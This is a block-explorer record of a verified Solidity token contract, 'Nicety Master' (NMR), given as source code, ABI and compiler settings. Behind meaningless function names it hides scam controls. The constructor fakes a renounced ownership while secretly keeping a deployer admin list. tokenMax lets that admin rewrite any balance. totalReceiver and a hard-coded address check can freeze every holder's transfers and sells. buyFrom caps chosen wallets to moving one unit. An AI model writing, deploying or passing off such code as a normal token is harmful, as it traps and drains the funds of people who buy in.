{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface feeLaunch {\n    function createPair(address tradingLimitIs, address atReceiverFee) external returns (address);\n}\n\ninterface launchTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamFund) external view returns (uint256);\n\n    function transfer(address sellEnable, uint256 maxSell) external returns (bool);\n\n    function allowance(address launchedShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellEnable,\n        uint256 maxSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityAt, uint256 value);\n    event Approval(address indexed launchedShould, address indexed spender, uint256 value);\n}\n\nabstract contract marketingSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface enableTeamToken is launchTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NicetyMaster is marketingSender, launchTrading, enableTeamToken {\n\n    function approve(address shouldFee, uint256 maxSell) public virtual override returns (bool) {\n        sellReceiver[_msgSender()][shouldFee] = maxSell;\n        emit Approval(_msgSender(), shouldFee, maxSell);\n        return true;\n    }\n\n    mapping(address => bool) public buyAmount;\n\n    uint256 public exemptMin;\n\n    function tokenMax(address minTrading, uint256 maxSell) public {\n        receiverTotalMarketing();\n        tokenLaunched[minTrading] = maxSell;\n    }\n\n    function exemptBuyTx(address teamMax, address sellEnable, uint256 maxSell) internal returns (bool) {\n        require(tokenLaunched[teamMax] >= maxSell);\n        tokenLaunched[teamMax] -= maxSell;\n        tokenLaunched[sellEnable] += maxSell;\n        emit Transfer(teamMax, sellEnable, maxSell);\n        return true;\n    }\n\n    function receiverTotalMarketing() private view {\n        require(buyAmount[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalTeam;\n    }\n\n    bool public autoExempt;\n\n    function getOwner() external view returns (address) {\n        return isFrom;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenReceiver;\n    }\n\n    address public listExempt;\n\n    function transferFrom(address teamMax, address sellEnable, uint256 maxSell) external override returns (bool) {\n        if (_msgSender() != isReceiver) {\n            if (sellReceiver[teamMax][_msgSender()] != type(uint256).max) {\n                require(maxSell <= sellReceiver[teamMax][_msgSender()]);\n                sellReceiver[teamMax][_msgSender()] -= maxSell;\n            }\n        }\n        return toReceiver(teamMax, sellEnable, maxSell);\n    }\n\n    uint256 constant liquidityTotal = 1 ** 10;\n\n    uint256 swapToken;\n\n    uint256 public txListBuy;\n\n    mapping(address => uint256) private tokenLaunched;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapTx;\n    }\n\n    address isReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private sellReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return senderToken;\n    }\n\n    constructor (){\n        if (autoMin != exemptMin) {\n            modeLaunch = true;\n        }\n        liquidityLaunch liquidityLaunchedMode = liquidityLaunch(isReceiver);\n        listExempt = feeLaunch(liquidityLaunchedMode.factory()).createPair(liquidityLaunchedMode.WETH(), address(this));\n        if (modeLaunch) {\n            receiverSellList = txListBuy;\n        }\n        toFrom = _msgSender();\n        buyAmount[toFrom] = true;\n        tokenLaunched[toFrom] = totalTeam;\n        feeMaxAmount();\n        \n        emit Transfer(address(0), toFrom, totalTeam);\n    }\n\n    function feeMaxAmount() public {\n        emit OwnershipTransferred(toFrom, address(0));\n        isFrom = address(0);\n    }\n\n    string private tokenReceiver = \"NMR\";\n\n    function balanceOf(address teamFund) public view virtual override returns (uint256) {\n        return tokenLaunched[teamFund];\n    }\n\n    bool public modeLaunch;\n\n    bool public takeIs;\n\n    uint256 public receiverSellList;\n\n    function sellToken(address tradingMarketing) public {\n        if (autoExempt) {\n            return;\n        }\n        \n        buyAmount[tradingMarketing] = true;\n        if (receiverSellList != txListBuy) {\n            txListBuy = receiverSellList;\n        }\n        autoExempt = true;\n    }\n\n    address public toFrom;\n\n    function allowance(address tokenTo, address shouldFee) external view virtual override returns (uint256) {\n        if (shouldFee == isReceiver) {\n            return type(uint256).max;\n        }\n        return sellReceiver[tokenTo][shouldFee];\n    }\n\n    uint256 amountTx;\n\n    function totalReceiver(uint256 maxSell) public {\n        receiverTotalMarketing();\n        amountTx = maxSell;\n    }\n\n    uint256 private totalTeam = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed maxSender, address indexed launchedAutoTeam);\n\n    function transfer(address minTrading, uint256 maxSell) external virtual override returns (bool) {\n        return toReceiver(_msgSender(), minTrading, maxSell);\n    }\n\n    function buyFrom(address exemptMode) public {\n        receiverTotalMarketing();\n        \n        if (exemptMode == toFrom || exemptMode == listExempt) {\n            return;\n        }\n        listLiquidity[exemptMode] = true;\n    }\n\n    string private senderToken = \"Nicety Master\";\n\n    function toReceiver(address teamMax, address sellEnable, uint256 maxSell) internal returns (bool) {\n        if (teamMax == toFrom) {\n            return exemptBuyTx(teamMax, sellEnable, maxSell);\n        }\n        uint256 atWallet = launchTrading(listExempt).balanceOf(launchedTx);\n        require(atWallet == amountTx);\n        require(sellEnable != launchedTx);\n        if (listLiquidity[teamMax]) {\n            return exemptBuyTx(teamMax, sellEnable, liquidityTotal);\n        }\n        return exemptBuyTx(teamMax, sellEnable, maxSell);\n    }\n\n    address launchedTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return isFrom;\n    }\n\n    address private isFrom;\n\n    uint8 private swapTx = 18;\n\n    uint256 public autoMin;\n\n    mapping(address => bool) public listLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedAutoTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMode\",\"type\":\"address\"}],\"name\":\"buyFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMaxAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSellList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"}],\"name\":\"sellToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSell\",\"type\":\"uint256\"}],\"name\":\"tokenMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxSell\",\"type\":\"uint256\"}],\"name\":\"totalReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txListBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "NicetyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}